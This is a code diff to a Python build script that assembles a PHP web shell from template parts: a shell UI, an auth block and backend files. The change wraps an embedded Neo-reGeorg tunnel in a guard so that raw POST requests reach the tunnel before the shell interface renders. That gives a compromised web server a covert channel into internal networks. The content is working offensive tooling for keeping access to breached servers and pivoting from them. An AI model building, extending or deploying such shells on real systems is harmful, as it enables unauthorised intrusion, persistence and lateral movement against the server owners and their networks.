@@ -220,14 +220,12 @@ def build(args):
         fname = os.path.basename(fpath)
         if fname in excluded_backend:
             continue
-        if fname == 'auth.php':
-            continue  # Auth is handled separately via template placeholder
         content = read_file(fpath)
         backend_parts.append(content)
     backend = '\n'.join(backend_parts)
 
     # Neo-reGeorg tunnel injection
-    neoreg_tunnel = ''
+    tunnel_block = ''
     if args.tunnel:
         if 'tunnel' in exclude:
             print("[!] Cannot use --tunnel with --exclude tunnel")
@@ -240,11 +238,20 @@ def build(args):
         # Strip opening <?php tag — we're embedding inside an existing PHP block
         neoreg_code = re.sub(r'^<\?php\s*', '', neoreg_code.strip())
         neoreg_code = re.sub(r'\?>\s*$', '', neoreg_code.strip())
-        neoreg_tunnel = neoreg_code
+        # Wrap in a guard that intercepts tunnel requests before the shell UI renders.
+        # POST without form 'action' = Neo-reGeorg tunnel command (raw binary body)
+        # GET hello check is not intercepted — neoreg client auto-detects body offsets
+        tunnel_block = (
+            "// Neo-reGeorg tunnel — intercept raw POST before shell UI\n"
+            "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action'])) {\n"
+            "ob_end_clean();\n"
+            + neoreg_code + "\n"
+            "exit;\n"
+            "}\n"
+        )
         print(f"[*] Neo-reGeorg tunnel embedded from: {tunnel_path}")
     elif 'tunnel' not in exclude:
         print("[*] No --tunnel provided, tunnel tab will show setup instructions only")
-    backend = backend.replace('// {{NEOREG_TUNNEL}}', neoreg_tunnel)
 
     # Auth block
     auth_block = ''
@@ -281,6 +288,7 @@ def build(args):
 
     # First pass — assemble without build meta (to compute hash of actual content)
     pre_output = template
+    pre_output = pre_output.replace('{{TUNNEL_GUARD}}', tunnel_block)
     pre_output = pre_output.replace('{{AUTH_BLOCK}}', auth_block)
     pre_output = pre_output.replace('{{BACKEND}}', backend)
     pre_output = pre_output.replace('{{CSS}}', css)
